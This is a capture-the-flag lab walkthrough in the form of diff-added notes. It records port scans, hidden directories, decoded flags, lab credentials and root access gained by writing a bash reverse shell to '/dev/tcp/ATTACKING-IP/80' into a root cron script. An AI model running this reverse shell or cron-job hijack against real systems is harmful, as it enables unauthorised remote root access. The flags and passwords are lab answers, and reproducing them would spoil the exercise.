@@ -1,0 +1,59 @@
+IP : 10.10.182.180
+
+Open Ports : 80(nginx),6498(ssh),65524(apache)
+
+80 : nginx version 1.16.1
+
+Hidden directory found : /hidden
+
+hidden directory : page title : Welcome to ctf
+
+Found another hidden directory in /hidden : /whatever
+	found a base 64 encoded string : ZmxhZ3tmMXJzN19mbDRnfQ==
+	found first flag : flag{f1rs7_fl4g}
+
+Lets check th apache port.
+
+65524 : Apache default page,
+	We found an base encoded string : ObsJmP173N2X6dOrAgEAL0Vu
+	Ltes check that in cyberchef : /n0th1ng3ls3m4tt3r
+	We found a flag named flag3 : flag{9fdafbd64c47471a8f54cd3fc64cd312}
+	
+	We also have robots.txt : We got an hash : a18672860d0510e5ab6699730763b250
+	We found second flag : flag{1m_s3c0nd_fl4g}
+
+	Lets visit the hidden directory : /n0th1ng3ls3m4tt3r
+
+	We found another encoding : 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81
+
+	Googlin this we found that it is GOST Hash : we got a password : mypasswordforthatjob
+
+	Also we have a image over the similar looking backgroud, lets download
+
+	Lets use the password we just found : We found credentials, username : boring
+
+	Password is in binary, lets decode it : iconvertedmypasswordtobinary
+
+Lets SSH :
+
+We found user's flag : synt{a0jvgf33zfa0ez4y}
+Looks lite it has rot cipher. : using rot 13 we found the flag : flag{n0wits33msn0rm4l}
+
+Privesc : lets upload linpeas:
+
+	We have a cron job running every minute : * *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh
+
+Lets check it out
+	It has content :
+		#!/bin/bash                                                                                                             
+		# i will run as root
+
+
+Lets try this to get a reverse shell.
+	bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
+
+Wait for a minute and we got a root shell.
+
+Lets get the root flag : root flaf hound in hidden .root.txt : flag{63a9f0ea7bb98050796b649e85481845}
+
+!!!
